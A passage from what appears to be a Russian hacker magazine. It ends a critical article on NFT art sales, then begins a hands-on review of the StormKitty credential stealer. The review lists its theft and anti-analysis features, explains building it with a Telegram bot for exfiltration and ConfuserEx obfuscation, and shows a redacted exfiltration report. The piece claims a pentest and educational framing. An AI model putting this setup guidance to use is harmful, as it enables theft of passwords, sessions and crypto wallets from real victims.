на «дропах», то есть огра ниченных по времени распродажах коллекций име‐
нитых художников. Nifty при этом еще поз воляет художнику зарабатывать
роялти от перепродаж.





                          OpenSea

Что до площадок вроде OpenSea и Rarible, то они скорее для тех, кто сам
себя прорекламирует. OpenSea при этом вообще стоит немного особняком,
поскольку не только поз воляет выпускать токены и торговать ими, но еще
и выступает бэкендом для других платформ.


Что такое «метаверс»?
Термин, по употреблению которого можно отличить наиболее упоротых
замечтавшихся криптовалютчиков. В воз можнос ти создавать свои валюты
и за них продавать циф ровые сущ ности им видится уди вительный новый мир.
Точнее, даже разные миры, свя занные друг с дру гом рыночной экономи кой.
  Не исклю чено, что в этом что‐то есть. Однако примерно теми же словами
и с не менее горящими глазами двадцать с чем‐то лет назад говорили о вебе
и покупали пиксели на  Million  Dollar Homepage. Удивительное будущее,
может, и наступит, но некоторые вещи могут задержаться еще лет на двад‐
цать, а за это время нынешние вло жения полностью обесценятся.



БОЛЬШИЕ СДЕЛКИ — БОЛЬШАЯ ШУМИХА
С 2017 по 2021 год мир NFT жил сам по себе и был по большей части развле‐
чением для пре сыщенных бит койновых богачей. Но первые громкие сдел ки
привлекли внимание широкой аудитории, а вместе с ним — и новые деньги.
  Первой такой сделкой ста ла про дажа мема Nyan Cat.





Его автор Крис Торрес выс тавил на аукцион Foundation спе циально перери‐
сованную и  улуч шенную версию анимиро ванной кошечки и заработал
на этом 300 ETH, или 637 тысяч долларов по текущему курсу.


Граймс
Героиня сле дующего громкого эпизода — певица Граймс, известная в числе
прочего  благодаря  своему  зна менитому  мужу —  пред принимателю
и популярному мик роблогеру Илону Мас ку.
   Граймс выставила на аукцион Nifty серию работ WarNymph, которые соз‐
дала вместе со своим братом, художником Маком Бушером. Собственно,
Мак отвечал за визуаль ную сос тавля ющую, а Граймс сочини ла музыку
для коротких роликов.





      Анимация с треком Grimes, ушедшая на Nifty за 7500 долларов

Всего выручка за WarNymph составила в рай оне 6 миллионов долларов.
Некоторые работы ушли в единственном экземпля ре, другие — тиражами
в сотни копий. Допол нитель ный пиар предоставил Маск. Где, собственно,
искать энтузиастов таких вещей, как не среди его подписчиков в твиттере?


Бипл
Настоящим поворотным моментом для NFT стала продажа работы Everydays:
the First 5000 Days Майкла Винкельманна, более известного по псевдониму
Beeple. Сумма сделки — это пока что абсолютный рекорд для NFT —
69,3 миллиона дол ларов. Это много даже за пределами криптовалютного
мира: среди работ, проданных при жизни худож ника, есть всего две стоивших
дороже. Однако интересен здесь не только ценник.
  Необычно и само про изведение. «Первые 5000 дней» — это не просто
картина, а коллаж из пяти тысяч изображений, на каждое из которых Бипл
потратил по одному дню — отсю да и название. Результат — гигантское
полотно, аккумулирующее тру ды за 13 с полови ной лет.





                  Фрагмент «Первых 5000 дней»

Другое отличие этой сделки — учас тие аукцион ного дома «Кристис». Хоть
за техническую сторону при этом отвечала плат форма Nifty, формально кар‐
тина была продана обычным, тра диционным для большого искусства спо‐
собом. Покупатель даже получил токен, оформленный в виде физического
сувенира. По всей видимос ти, целью было именно убедить кол лекционе ров
в серьезности всей затеи.





       «Первые 5000 дней» и дру гие работы Бипла в виде сувениров

Правда, купил картину в итоге не какой‐то музей или владелец частной кол‐
лекции традиционного искусства, а некто под псевдонимом Metakovan. При‐
мечательно, что этот Метакован — владелец инвестфонда, вкладывающего
деньги в NFT, и ранее он уже приобретал картины Бип ла. Кстати, еще до исто‐
рии с «5000 днями» тот про дал своих работ на 3,5 миллиона долларов.


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ
    NFT — ЭТО СКАМ!
             КАК ТОРГОВЛЯ ЦИФРОВЫМ ИСКУССТВОМ
            ЗАХВАТИЛА УМЫ И ЧТО ИЗ ЭТОГО ВЫЙДЕТ





Бэнкси
Незадолго до истории с Биплом неожиданным участником шумихи вокруг NFT
стал Бэнкси. Причем сам он никак не был задействован в мероприятии. Его
работу Morons (White), созданную в 2006 году, купила криптовалютная ком‐
пания Injective Protocol за 95 тысяч долларов — специально, чтобы устроить
шоу и прорекламировать свою платформу SuperFarm.





Картину сожгли и записали процесс на видео. Чем отчасти повторили трюк
самого Бэнкси, который в 2018 году продал самоуничтожающуюся картину
«Девочка с воздушным шаром». Сра зу пос ле про дажи она измельчила сама
себя при помощи встроенно го в толстую раму шредера.
   Бэнкси, правда, хотел поиздевать ся над богатенькими кол лекционерами,
а вот у криптостартаперов была дру гая идея — они сожгли оригинал, но под‐
писали циф ровую копию при помощи NFT. И сра зу же устроили аукцион, где
цифровая репродукция Morons (White) ушла за 380 тысяч долларов.
  Мысль тут простая: этот ритуал был нужен, чтобы уничтожить подлинник
и таким образом как бы передать этот статус цифровой копии. Пока что
подобный фокус ник то повторять не стал. Но если вдруг начнется мода
на сожжение подлинников во славу NFT, это будет занятным развитием
событий!





Как по мне, уровень иро нии здесь просто невыносимый. На картине Бэнкси
изображен тот самый аукцион «Кристис», и названа она обидным словом
неспроста. На ней с молотка пускают оформленное в тяжелую раму полотно
с надписью «Не могу поверить, что вы, при дурки, это покупаете». Что ж, после
миграции на NFT в это поверить еще сложнее!


Джек Дорси
«Просто настраиваю мой twttr», — написал основатель Twitter Джек Дорси
в 2006 году и отправил эту строчку, собственно, в twttr (гласные в название
добавили позже), запос тив таким образом первый твит. Спустя почти ров‐
но 15 лет Дорси выставил его на про дажу через плат форму Valuables.





Текущее предложение составляет 1630 ETH — в рай оне трех миллионов дол‐
ларов. Однако торги на Valuables могут длиться бес конечно — пока владелец
сам не решит, что сумма его устра ивает.
  Другая интересная осо бенность этой платформы — в том, что автор твита
не может сам выставить его на продажу. Предложение об этом может сде‐
лать только читатель. Он назначает стартовую сумму и оставля ет в коммента‐
риях специально сгенерированную ссылку. Автор твита, если ему нравится
эта идея, начинает аукцион.
  Исторический твит Дорси сейчас лидиру ет по цене с огромным отрывом.
К примеру, твиты Илона Маска пока что стоят лишь десятки тысяч долларов,
а не миллионы.





Кстати, самая популярная тема здесь — это шутки про криптовалюты. Так что
если у тебя есть подходящий винтажный твит, то, возможно, уже скоро пос‐
тучится первый покупатель.


И другие
Далеко не каждую сделку сопровождает такая же шумиха, хотя суммы подчас
впечатляющие. Например, художник по имени Pak в середине марта продал
свою работу Finite за 444 ETH — почти миллион долларов.





                                           Finite

Золотая лихорадка не обошла стороной и рос сийских творцов. К при меру,
свои наиболее знаменитые работы выставили Gudim (его мем Drowning High
Five ушел пример но за пять тысяч долларов) и Дюран — знаменитый Гнвоерк
принес ему в районе четырех тысяч долларов по текущему курсу эфира.





Еще успешнее продается творчес тво группы Pussy Riot, широко известной
за рубежом. Кусоч ки клипов уходят за десятки тысяч долларов, а первый
из них был продан за 100 ETH, то есть 200 с лишним тысяч.


ПРОБЛЕМЫ NFT
Энтузиасты NFT любят на все сомнения отвечать фразами в духе «да вы прос‐
то не понимаете». Настала, мол, новая реальность, а кто в нее не врубается,
просто останется брюзжать и портить воз дух на обочине истории. Впрочем,
еще не поздно одуматься, дос тать свои сбережения, сконвертировать
в «эфир» и успеть запрыгнуть в последний вагон уходяще го поезда.
  При некотором усилии действитель но мож но убедить себя, что все
в порядке. Но чем агрессивнее тебя уго варивают принять что‐то на веру, тем
сильнее должны расти подозрения. Поэтому мы все же предпримем попытку
понять, разобраться и найти хотя бы самые очевидные изъяны NFT.


Проблема 1. Копия полностью идентична оригиналу
Сторонники NFT напирают на то, что в искусс тве и в целом коллекционирова‐
нии важна аутентичность. Но можно ли ее просто взять и синтезировать
при помощи цифровых токенов?
   Вот, к примеру, та самая «Звез дная ночь», которую Ван Гог нарисовал,
глядя из окна своей спальни в больнице для душевнобольных (куда попал
после знаменитого инцидента с отрезанием уха). Люди специально едут
в Нью‐Йорк и платят 25 долларов за билет в музей современного искусства,
чтобы потолкаться именно перед ней, а не перед реп родукцией. Вот они, тол‐
кутся, и я толкусь с ними.





А вот тот самый «Сад земных нас лаждений», который Иероним Босх написал
еще в 1500 году. Люди едут в Мадрид и идут в музей Прадо, чтобы пос‐
мотреть именно на тот самый триптих (несмотря на то что в интерне те его
разглядывать намного удоб нее). Я тоже схо дил.





А вот троллфейс. Автор это го шедевра недавно про дал его через Foundation
за 70 тысяч долларов.





Идти за ним никуда не нужно, и тем не менее ты видишь перед собой на экра‐
не точно такой же троллфейс, как и я. Он полностью идентичен тому, что
рисовал автор, как и любая дру гая картинка, соз данная на компьютере. Он
бесконечно тиражировался до продажи и будет тиражироваться пос ле. Даже
через 500 лет он будет все таким же, и никого не впечатлит, что он сохранил‐
ся и дошел до потомков сквозь эпо хи.
  Справедливости ради, в мире искусства все же есть нечто похожее
на NFT — это подписанные фотографом снимки. Из цифрового изображения
или из пленочного негатива можно напечатать сколько угодно физичес ких
копий, поэтому на аукционах обычно про даются карточки, подписанные
фотографом от руки. Здесь, как и в слу чае с NFT, ценна сама подпись, сто‐
ящая рядом с работой (подробнее об этом — в посте Джека Рашера).





        Подпись фотографа Генри Леви на отпечатанном снимке

Впрочем, на фотоснимках хотя бы подпись дела ется непос редственно рукой
автора, а NFT — это в лучшем случае ана лог штампа. Но куда больше покупа‐
телей должно вол новать отсутс твие прямой свя зи между токеном и произве‐
дением…


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ
    NFT — ЭТО СКАМ!
             КАК ТОРГОВЛЯ ЦИФРОВЫМ ИСКУССТВОМ
            ЗАХВАТИЛА УМЫ И ЧТО ИЗ ЭТОГО ВЫЙДЕТ





Проблема 2. Слабая связь с реальностью
Может показаться, что вкладывать день ги в NFT — примерно то же самое, что
покупать предметы искусс тва. Увы, это только ловко созданная иллюзия. Пла‐
тя за NFT, ты покупаешь не произведение, а именно токен, и ничем, кроме
токена, владеть не будешь.
  Не стоит путать NFT и с авторскими пра вами. Те — тоже в своем роде
информационная сущность, но совершенно дру гая. Права на проданное про‐
изведение остаются у художника, и если ты вдруг вздумаешь использовать
его картину в коммерческих целях, то автор сможет успешно судиться. Счи‐
тается, впрочем, что это не баг, а фича.


             INFO

                     Существует  схема, при  которой  автор  будет
                        получать проценты от последующих сделок (нап‐
                       ример, пятую часть). Разве не справедливо, что
                         богатеть будет не только коллекционер, но и
                       художник?


Другой побочный эффект виртуальнос ти происходящего — сложности
с гарантиями. Посколь ку мы имеем дело с нефизическими сущностями,
обмануть покупателя становится гораз до проще. Человек, продающий токен,
может, к примеру, не быть автором работы. Это вро де бы очевидное мошен‐
ничество,  но, раз ты покупа ешь токен, а не произведение, этот трюк
при определенных условиях даже не будет нарушать закон.
  Следить, чтобы такого не происходило, должна платформа и отве чать сво‐
ей репутацией. Но пока платформы плодятся ежедневно, говорить об этом
рановато. Недобросовестный раз работчик может даже потакать мошенникам
или быть с ними в сговоре.
   Кстати, о сговоре! Клас сический метод наперсточников — использовать
подставных игроков, чтобы вовлекать пуб лику. То же иногда случается и в
мире большого искусства: художник или перекупщик договариваются с фаль‐
шивым покупателем и делают вид, что продают про изведение. А затем вся‐
чески афишируют сумму сделки, что бы задрать цену на этот и другие свои
товары. В интернете подобными вещами заниматься легче легкого, посколь‐
ку вместо настоящих имен покупателей мы видим ничего не говорящие ник‐
неймы, а сделки совершаются за криптовалюту.
  Поговаривают, что Бипл именно так «про дал» (то есть передал) «Пер‐
вые 5000 дней». Поскольку Метакован уже покупал работы Бипла, шумиха
вокруг этой сделки сильно подняла их в цене. Бипл на вопрос о том, получил
ли он деньги, отвечает: «100 процентов, чувак!» Но говорить‐то можно что
угодно.
  По крайней мере в случае с этой сдел кой извес тно, что аукцион «Кристис»
получил свою долю — около 15 миллионов долларов. В интернете плат‐
формы‐посредники тоже берут свою долю, но это не мешает подозревать,
что процент недоб росовес тных сделок может быть высоким. Сопровож‐
дающие траты могут казаться дельцам ерундой по сравнению с будущими
прибылями.





                    Работа Бипла на «Кристис»

Последний штришок — отсутс твие существу ющих примеров того, как спор‐
ные вопросы решаются через суд. Что‐то подска зывает, что судьи не будут
рады столкнуться с причудливым миром токенов и блокчейнов, а геог‐
рафическая разбросанность всей системы даст мошенникам допол нитель‐
ный шанс скрыться от наказа ния.


Проблема 3. Технические сложности
«Из любопытства копнул информацию о том, как NFT в реальности ссылаются
на медиа, которые ты „покупаешь“, и мои брови вышли на орбиту луны», — пи‐
шет Джонти Уоринг в твиттере и дальше проводит подробный раз бор про‐
исходящего.
  Корень проблемы — в том, что токен и произведение хранятся раздельно.
Например, платформа Nifty Gateway работает так. Для медиафайла с про‐
изведением создается описание в формате JSON. Самое важное в нем —
это ссылка, указывающая на сервер Nifty, который при запросе перенаправит
браузер на картинку, сохраненную в распределенной файловой сис теме
IPFS.
   Звучит убе дительно? Если да, то не спеши обольщаться. Дело в том, что
токен, который ты покупаешь, — это хеш‐сумма от файла JSON, а не
от самого произведения. Токен при этом хра нится в блокчейне Ethereum.
Случись что с Nifty, и связь между ними разорвется. Да и IPFS — не гарантия
надежности: информация здесь хра нится, только пока ее активно запрашива‐
ют.


             INFO

                    Небольшая оговорка: IPFS может потерять файл,
                      но при этом оставляет возможность загрузить
                       заново его точную копию. Система хранит хеш
                         от изначального файла и сверит его, чтобы избе‐
                       жать подделки. Подробнее об этих нюансах —
                        в треде @scanlime.


И покупатели, и продавцы, по сути, оказыва ются в полной зависи мости
от владельцев площадки. Что, если те ока жутся нечистыми на руку? Нап‐
ример, они могут взять и объявить какие‐то сделки недей ствительными,
и ничто не помешает им сгенерировать другие токены и продать работы сно‐
ва. Или вдруг владельцам вздумается отка тить блокчейн, породив форк?
Такое уже бывало в мире криптовалют. Или вот еще идейка — начать шан‐
тажировать клиентов, требуя от них оплаты за поддержание ссы лок на плаву.
Вариантов масса!
  Пока на кону репута ция торговых пло щадок, вряд ли их владельцы станут
заниматься чем‐то, что отпугнет покупа телей. Но что, если дела пойдут хуже
и терять окажется нечего? Лежащую в личном хра нилище картину не кос‐
нулось бы ни разорение аукционного дома, ни внезапное решение его вла‐
дельцев сде лать пластическую операцию и сбежать в Эквадор. NFT в этом
плане серьезно отличается.


Проблема 4. Может не взлететь
«У меня есть два криптокотенка, хочу их продать и завязать с этим», — ссылку
на этот пост на «Реддите» я сохранил три года назад как прекрасную демонс‐
трацию проблемы с подобными историями. Автор пишет: «Я заплатил
за них 300 долларов и, кажется, переплатил. Может мне кто‐нибудь показать,
как их продать, чтобы больше о них не думать? И сколько они стоят? Как их
вообще оценить? Я готов потерять день ги, прос то уже хочется с этим покон‐
чить».
  В ответ ему сооб щают, что котята теперь сто ят в районе 5 долларов
за обоих, а он сокруша ется: «Почему это про изошло?» Котята, кстати, так
до сих пор и не проданы.





Проект CryptoKitties был одним из первых случаев, когда NFT привлек к себе
внимание широкой публики. По задумке раз работчиков, игроки должны были
приобретать и скрещивать кошек, выводя редкие породы. В реальности
это превратилось в типичную пирамиду. Заработали на криптокотятах только
их создатели и первые заводчики. А большинс тво покупателей, как бывает
в таких случаях, осталось с неликвидными активами на руках, как только
шумиха улеглась и приток лохов стал исся кать.


             INFO

                       Разработчики CryptoKitties (Dapper Labs) избе‐
                      жали громких обвинений в мошен ничестве, пос‐
                        кольку ловко придумали называть происходящее
                         игрой. Котяток, мол, покупают ради развлечения,
                       а если кто‐то захотел серьезно в них вложиться
                      и потерял деньги, то это его проблема.


Художественные произведения, в отли чие от бесконечно плодящихся котят,
хотя бы выпускаются либо в одном экземпляре, либо ограниченным тиражом.
Однако ничто не страхует их от забвения. Если интерес публики к технологии
вдруг начнет ослабевать, цены войдут в штопор и могут никогда не вернуться.
   Традиционные жанры искусства сопряжены с похожими рисками — кар‐
тины модного художника тоже могут ока заться переоцененными. Но при этом
хотя бы не случится такого, что картины окажутся переоценены в принципе
или через пару лет все решат, что скульптуры — это чушь собачья. С NFT
и тем более с какими‐то конкрет ными пло щадками — легко! За художников
при этом можно не вол новать ся — они спокойно перекатятся на новое место,
а вот дорогостоящие покупки — нет.


ЧЕМ ДЕЛО КОНЧИТСЯ?
Если отвлечься от мыслей про шальные деньги, вокруг которых вертится вся
эта затея, то становится чуть полегче. Признаться, пока я собирал материал
для статьи, листать Foundation, Nifty и SuperRare было одно удовольствие. Все
такое свежее, модное и классно шевелится, что прос то ах!





Раньше подборки мемов, гифок и сочных рендеров были скорее уде лом
любителей с Tumblr и Pinterest, а теперь на виртуаль ных выставках под прис‐
мотром специалистов рас цветают новей шие формы циф рового искусства.
Так и хочется пожелать успехов первопроходцам – пус кай сде лают с пыль‐
ными галере ями то же, что «Википедия» сделала с «Британникой» и БСЭ.
Возможность платить талантливым художникам за их труд — важный шаг
на пути к этому.





Безусловно, часть перечисленных мной проблем можно решить, а с оставши‐
мися найти способы как‐то уживаться. Но про изойдет это не сразу. NFT
называют «уникальным явлением на стыке виртуаль ного и реального», но его
обратной стороной будут уникальные проблемы на сты ке технических сбоев
и обыкновенной уголовщины.
  За примерами далеко ходить не нужно: и сами криптовалюты, и ICO
пережили подобный резкий старт, который вскоре перешел в череду громких
скандалов и горьких разоча рова ний. Истории вроде Mt.Gox или The DAO обя‐
зательно повторятся и в мире NFT — уже даже можно прикинуть, по каким
швам пойдет разрыв.
   Ну и в конце концов, NFT — это мошенничество в широком смысле слова.
Если мы наделяем ценой какую‐то вещь, из которой нельзя извлечь немед‐
ленной пользы, и дальше она чего‐то сто ит прос то потому, что мы заставили
других в это поверить, то кто‐то обязательно будет кричать «обман‐обман!».
  Многие виды такого «обмана» при этом выживают столети ями. Люди дав‐
но с ними свыклись и научились применять акку рат но, зачастую даже на бла‐
го. Мы называем их словами вроде «деньги», «акции», «обязательства», «дип‐
ломы», «подлинники», «реликвии» и так далее. Не исключено, что, когда пер‐
вичный стартаперский бульон перестанет кипеть и пузыриться на огне
оппортунизма, NFT тоже сможет встать в один ряд с разводами‐победителя‐
ми.
  Либо, как вариант, выкипит и так заб рызгает все вокруг, что к этой теме
еще долго никто не захочет прикасаться. С технологиями, которые «стре‐
ляют» преждевременно, такое бывает сплошь и рядом.


Читай также

 • Сегодня в эфире. Краткий экскурс в Ethereum
 • О чем весь этот Ethereum. Виталик Бутерин о себе и о создании Ethereum
 • Распределенное автономное ограбление. Как хакер разорил главный
   криптовалютный проект года
 • Атлас мира криптовалют. Раз бираемся с ICO и ориентируемся в новых
   криптопроектах
 • Как крадут деньги при ICO. Разбира ем типовые сце нарии похищения
   средств и самих ICO
ВЗЛОМ
   КОТ
 АТАКУЕТ!

      ИЗУЧАЕМ ОТКРЫТЫЙ СТИЛЕР
             STORMKITTY





                                              Hackcat
                                             hackcat.dev@gmail.com





Общеизвестно,  что, если ты вдруг забыл (или никогда
не знал) пароль от какого‐нибудь сервиса, но он сохранен
в браузере, есть возможность его оттуда достать. Не менее
известно и то, что с такой же легкостью сохраненные пароли
достанет и любой троян, по стечению обстоятельств попав‐
ший к тебе в комп. Сегодня мы рассмотрим один такой вре‐
донос с милым названием и покажем, как он работает.


При пентесте организации час то бывает нуж но выполнить нагрузку на взло‐
манном компьютере. Максимально убедительным доказательством успеха
для заказчика будет список паролей с компьютеров сотрудников, а получить
их поможет прекрасный стилер StormKitty. Он бесплат ный, откры тый, стабиль‐
но работает, а еще присыла ет результаты работы прямо в Telegram. Сказ ка,
а не стилер. Немудрено, что с гит хаба его уже снес ли (впрочем, ненадол го),
а антивирусы истошно кричат при его виде.
   Раз уж ты читаешь «Хакер», бессмысленно рас сказывать, зачем нужен сти‐
лер и чем он отличается от шифровальщика или ратника. Лучше давай ска‐
чаем исходники или готовый билд с зеркала про екта на GitHub, рас пакуем
и посмотрим на него поближе.


           WARNING

                      Автор  и  редакция  не  несут  ответственности
                        за любой вред, причиненный с использованием
                      материалов этой статьи. Распространение вре‐
                      доносных программ, несанкционированный дос‐
                         туп к информации, нарушение тайны переписки —
                         уголовные преступления. При проведении тестов
                       на   проникновение   необходим   письменный
                       договор с заказчиком.



ЛАПКИ МНОГОФУНКЦИОНАЛЬНЫЕ
Что вообще может наш кот? По заверению автора — много чего. Тут и сама
кража данных, и фин герпринтинг системы, и даже более продвинутые фун‐
кции, вроде противо действия анализу и встроенного в сборщик обфускатора.
Только за пивом ходить не умеет! Вот полный список заявленных функций:
 • Ан тианализ. Сюда вхо дит обнаружение вир туальных машин Hyper‐V, Vir‐
   tualBox и VMware (по идентификаторам виртуального оборудования),
   песочниц Sandboxie и COMODO (по списку процессов), а также анализа
   на VirusTotal и Any.Run. Антидебаг гер просто дергает WinAPI‐функцию
  CheckRemoteDebuggerPresent,  а  защита  от  запуска  в  системах
   онлайн‐анализа проверяет, не принадлежит ли внешний IP хостинг‐про‐
   вайдеру. Честно говоря, я ожидал тут чего‐то большего.
 • Фин герприн тинг. Собира ет версию ОС, модель и характеристики цен‐
   трального процессора и GPU, сведения об оперативной памяти, IP‐адре‐
   сах, BSSID окружающих точек доступа, геолокацию, информацию об экра‐
   не и установленных программах. Список вну шительный, и  StormKitty
   генерирует даже идентифика тор системы, позволяющий однозначно
   определить компьютер. В довесок улетают ключ активации системы и спи‐
   сок процессов.
 • По хищение дан ных из браузе ров. Под раздачу  (точнее, сбор)
   попадают браузеры на Chromium (похищаются пароли, данные карт, cook‐
    ies, история, данные автозаполнения и закладки), Firefox (cookies, история
   и закладки, а также про чие файлы БД из папки браузера), Internet Explorer
   и Microsoft Edge (из них достаются только пароли).
 • Информация о сетях Wi-Fi. Стилер отпра вит тебе сохраненные сети
   и результаты сканирования дос тупных сетей (тогда в отчет попадают SSID
   и BSSID найденных точек дос тупа).
 • Сбор файлов с компьюте ра. Документы, картинки, исходный код,
   базы данных — в общем, все, что может представлять ценность. Стилер
   также умеет работать с флешками. В коде ука заны форматы файлов,
   которые будут похищены. И если с картинка ми и документами все
   более‐менее предсказуемо, то исходного кода автор решил наворовать
   впрок: в списке похищаемых — языки C, C++, C#, ассемблер, Bash,
   Python, HTML и CSS (WTF?), PHP, Go, JavaScript, Ruby, Perl, Swift, Java
   и Kotlin.
 • Об наруже ние бан ковских и криптовалютных сервисов в браузе-
   рах. Если функции выше еще можно притянуть за уши к законным целям,
   то ковырять финансовые сайты — однозначно зло. Мы эту функцию не тес‐
   тировали и тебе не рекомендуем.
 • Кража сессий из игро вых платформ. Сюда входят Steam, Uplay, Bat‐
    tle.Net и, конечно, всеми любимый Minecraft.
 • Установка кейлоггера и клиппера. Если с кейлоггером все понятно
   и в одной из прошлых ста тей я даже показывал, как его сделать самос‐
   тоятельно, то клиппер не такой известный вид вредоноса. Его суть в том,
   что он ищет в буфере обмена определен ную информацию и подменя ет ее
   другой. Типичный пример — адреса кошельков Bitcoin и других крип‐
   товалют, которые вручную набирать мало кто решается. Хоба — и адрес
   подменен, а драгоценные бит койны улетели на левый кошелек.
 • Скрин шоты с экрана и камеры. Автор заявляет, что камера активиру‐
   ется, когда пользователь будет замечен за просмотром непристойного
   контента.
 • Кража аккаунтов VPN. В списке есть ProtonVPN, OpenVPN и NordVPN.
 • Сбор критических файлов локальных кошельков. Да‐да, трой име‐
   ет специализированную функцию даже для это го. Неудивительно, что
   раньше он продавался на подпольных форумах. Что касается подвержен‐
   ных риску кошельков, то это  Zcash,  Armory,  Bytecoin,  Jaxx, Exodus,
   Ethereum, Electrum, AtomicWallet, Guarda и Coinomi. Смею надеяться, что ты
   никогда не применишь эту функцию.
 • Запись струк туры дирек торий.
 • Ко пиро вание сессий Telegram. При этом злоумышленник будет
   использовать тот же токен, что и оригинальный пользователь, так что лиш‐
   них записей в списке активных сеансов не появит ся.
 • Ак каун ты Outlook, Pidgin, Skype, Discord и Filezilla. Тут без ком‐
   ментариев.
 • Автозагрузка. Было бы странно, если бы ее не было. Реализована она
  неожиданно просто: исполняемый файл наг рузки прос то копиру ется
   в папку автозапуска — никаких тебе реес тров и пла нировщиков.

Как видишь, набор функций весьма обширный (и добрая половина воз‐
можностей даже близко не похожа на законные). Но, несмотря на это, выход‐
ной билд занимает всего 239 Кбайт и все зависимос ти встроены.


УСТАНОВКА
Если ты скачал исходники, то придется сначала собрать их. Код написан
на C# и хорошо читается, так что можно «на живом пациенте» изучать устрой‐
ство подобных программ. Для сборки я использовал Visual Studio 2019 с уста‐
новленным компонен том .NET desktop development. Все скомпилировалось
сразу и без фокусов — удивительно!
  Вместо сервера тут Telegram‐бот. Чтобы его использовать, придется соз‐
дать новый бот и зарядить его токен в наш билд. Для этого отправь главному
боту команду /newbot и следуй инструкциям.





                   Получится примерно так

Затем нужно скопировать токен (который я замылил) и вставить его в билдер.
Он представляет собой консольное приложение на все том же C#. Сборка
состоит из нескольких воп росов, пос ле которых будет выведен путь к готово‐
му билду.
   Часть функций (например, клиппер и кей логгер) не будут дос тупны, если
не использовать автозапуск.





                          Сбор ка

Как видишь, исполь зуется обфускация протектором ConfuserEx. Он, кстати,
вклю чен в релизную версию билдера в полном варианте, хотя используется
только консольный. Я не мог не проверить, что получается на выходе, и заг‐
рузил билд в декомпилятор dnSpy. Результат меня обрадовал: от кода
не осталось ничего человекочитаемого.





                          Код в dnSpy


             INFO

                        ConfuserEx — бесплатный и открытый протектор
                       для  .NET‐приложений.  Оригинальный  репози‐
                       торий автора заброшен, но мне удалось найти
                      более живой форк проекта. Среди прочего этот
                      протектор поддерживает защиту от отладчиков
                      и дамперов памяти, обфускацию потока выпол‐
                       нения и шифрование кода. Довольно мощ ный
                     комбайн, который гаран тирован но отпугнет мно‐
                         гих взломщиков!


Также я загрузил обфусцированный билд на virustotal.com, на котором прив‐
лек внимание 35 из 69 движков. При этом Avast, «Доктор Веб» и «Касперский»
молчат, что меня очень удивило. Ругани хватает и на сам факт использования
Confuser. К билдеру воп росов еще боль ше: среагировали 51 из 68. Видимо,
это из‐за содержания внутри ничем не прикрытой нагрузки.


ТЕСТИРУЕМ
Билд я собрал вручную из исходников. Клиппер и кейлоггер не включал, авто‐
запуск тоже. Ненужные функции на вся кий случай вырезал вообще.
  При запуске получил фейковое сообщение об ошиб ке.





Через пять минут после запус ка пришло длинное сообщение, в котором была
ссылка на файл. Давай пос мотрим на сооб щение поближе.


  ӥ StormKitty - Report:
       Date: 2021-XX-XX 6:53:28 PM
      System: Windows 10 Pro (64 Bit)
      Username: Hackcat
     CompName: HACKCAT-PC
      Language: Ɨ en-US
        Antivirus: Not installed
    Њ Hardware:
      CPU: Intel(R) Core(TM) i7-2670QM CPU @ 2.20GHz
      GPU: NVIDIA GeForce GT 540M
     RAM: 8102MB
      HWID: BFEBFBFF00*XXXXXX*
      Power: High (0.99%)
       Screen: 1366x768
    а Network:
      Gateway IP: 192.168.100.1
        Internal IP: 10.121.X.X
       External IP: X.X.182.6
      BSSID: cc:1a:fa:XX:XX:XX
    Ї Domains info:
   ∟ ʀ Banking services:
        - Agent.Privatbank
        - Qiwi
        - Stackexchange
        - Yoomoney
        - Оао Бпс‑Сбер банк
   ∟ Ͽ Cryptocurrency services:
        - Blockchain
        - My Btc Address
        - Trade.Aliexpress
   ∟ ǹ Porn websites (No data)
    ǆ Browsers:
   ∟ ќ Passwords: 468
   ∟ Ȑ Cookies: 2466
   ∟ Б AutoFill: 1457
   ∟ ⏳ History: 5892
   ∟ ѡ Bookmarks: 18
   ∟ е Downloads: 427
            Software:
   ∟ ✈ Telegram sessions
   ∟ ϻ Discord token
            Device:
   ∟  Windows product key
   ∟   Wifi networks: 16
   ∟ ƹ Desktop screenshot
              Installation:
   ∟ ⛔ Startup disabled
   ∟ ⛔ Clipper not installed
   ∟ ⛔ Keylogger not installed
    Г File Grabber:
   ∟ Б Source code files: 404
   ∟ Б Database files: 8
   ∟ Б Documents: 716
   ∟ Б Images: 75
    Ѣ Archive download link (https://anonfiles.com/XXXXXXXXXX)
  ћ Archive password is: "7e550a68*XXXXXXXXXXXXXXXXX*97682ff"

Все потенциально чувствительные данные я замазал, чтобы не было желания
покопаться в моих файлах.
  В самом сообщении ничего осо бо ценного нет. Но из указанного бро‐
саются в глаза несколько ошибок: Internal IP и Gateway IP не согласуются меж‐
ду собой (потому что внутренний IP при надлежит VPN), а список всех адап‐
теров и их адресов не выводится. При этом адаптеров у меня больше десят‐
ка — спасибо Microsoft Hyper‐V! Короче, тут косяк. Также StormKitty не нашел
второй экран.
  После скачивания и распаковки фай ла по ссылке я увидел такой набор
папок.





ЧТО В МЕШКЕ?
Проследуем в папку Browsers. Тут видим Google, InternetExplorer и Thun‐
derbird. В папке Гугла ожидаемо данные из «Хрома» в аккуратных текстовых
файлах. Тут у нас и автозаполнение, и закладки (не те, которые купил, а те,
которые закрепил в панель), и исто рия, и, конечно, кукисы.





Есть и перечень скачанных файлов. Он сохранен в виде списка со строками
такого вида:


### X:\fakepath\drweb‐cureit‐new.exe
### (https://free.drweb.ru/download+cureit+free/?ph=6501001bf82f...

И не был бы это стилер, если бы он не украл пароли. Они сохраняются в виде
таких записей:


Url: https://www.noip.com/sign‐up
Username: fake@xakep.ru
Password: did_y0u_expect_to_see_my_rea1_pa$$w0rd?


Url: http://192.168.0.1/
Username: admin
Password: admin
...

В папке для Internet Explorer оказался только токен авторизации в Azure Cloud
Shell для Windows Terminal. Что каса ется Thunderbird — профили стилер
извлек, вот только они оста лись зашифрованы. Не судьба, значит.
   Теперь пошли в Directories. Там в отдельных текстовых файлах раз‐
ложена древовидная структура некоторых папок на компьютере жертвы.
Сюда входят «Рабочий стол», «Документы», «Загрузки», «Картинки», «Автозаг‐
рузка», «Видеозаписи» и временная пап ка системы. Честно говоря, сложно
представить, зачем это может быть нужно.
  Папка Gaming оказалась пол ностью бесполезна. «Котенок» рас копал
у меня Minecraft, из которого забрал скрин шоты и список установленных вер‐
сий.





Смотрим результаты работы граббера. Он натас кал 1193 файла общим объ‐
емом 2,2 Мбайт. Звучит несерь езно! Ока зывается, он упаковал пару мелких
фоток, json‐конфигов и прочего хлама, при этом про пустив лежащие рядом
интересные файлы. Также в комплект попала папка, в которую я клонирую
